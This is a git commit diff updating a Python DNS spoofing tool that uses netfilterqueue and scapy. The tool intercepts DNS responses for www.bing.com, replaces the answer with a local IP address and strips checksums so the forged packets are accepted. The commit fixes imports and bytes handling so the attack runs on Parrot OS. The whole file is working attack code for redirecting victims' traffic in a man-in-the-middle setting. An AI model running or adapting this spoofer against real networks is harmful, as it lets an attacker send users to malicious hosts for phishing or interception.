49a4d2dd2368f627fcfd382a2f3760fb8ad921c7
danericp <40313553+danericp@users.noreply.github.com>
2023-11-23 18:26:15 +0000

    Update main.py
    Added fix, working in Parrot OS

--- dns-spoofer/main.py
+++ dns-spoofer/main.py
@@ -1,30 +1,30 @@
 #!/usr/bin/env python
 
 import netfilterqueue
-from scapy.all import scapy
+from scapy.all import *
 
 def do_packet_process(packet):
     ## Print the Packet details (netfilterqueue format)
     # print(packet.get_payload())
     ## Convert the netfilterqueue object into Scapy object
-    obj_packet_scapy = scapy.IP(packet.get_payload())
-    if obj_packet_scapy.haslayer(scapy.DNSRR):
+    obj_packet_scapy = IP(packet.get_payload())
+    if obj_packet_scapy.haslayer(DNSRR):
         ## Print Scapy object. Check the response
         print(obj_packet_scapy.show())
-        str_qname = obj_packet_scapy[scapy.DNSQR].qname
-        if "www.bing.com" in str_qname:
+        str_qname = obj_packet_scapy[DNSQR].qname
+        if "www.bing.com" in str_qname.decode():
             print("Spoofing Target")
-            obj_answer = scapy.DNSRR(rrname=str_qname, rdata="192.168.1.6")
+            obj_answer = DNSRR(rrname=str_qname, rdata="192.168.1.6")
             ## Modify the DNS Packet
-            obj_packet_scapy[scapy.DNS].an = obj_answer # DNS Record
-            obj_packet_scapy[scapy.DNS].ancount = 1 # Corresponding number of DNS Record
+            obj_packet_scapy[DNS].an = obj_answer # DNS Record
+            obj_packet_scapy[DNS].ancount = 1 # Corresponding number of DNS Record
             ## Deleting Checksums to let network refresh values and bypass checking
-            del obj_packet_scapy[scapy.IP].len
-            del obj_packet_scapy[scapy.IP].chksum
-            del obj_packet_scapy[scapy.UDP].chksum
-            del obj_packet_scapy[scapy.UDP].len
+            del obj_packet_scapy[IP].len
+            del obj_packet_scapy[IP].chksum
+            del obj_packet_scapy[UDP].chksum
+            del obj_packet_scapy[UDP].len
             ## Set the payload of the sniffed packet with out modified payload
-            packet.set_payload(str(obj_packet_scapy))
+            packet.set_payload(bytes(obj_packet_scapy))
     
     ## Let the Python program allow/block the packets to the target (Only 1 is allowed)
     packet.accept()
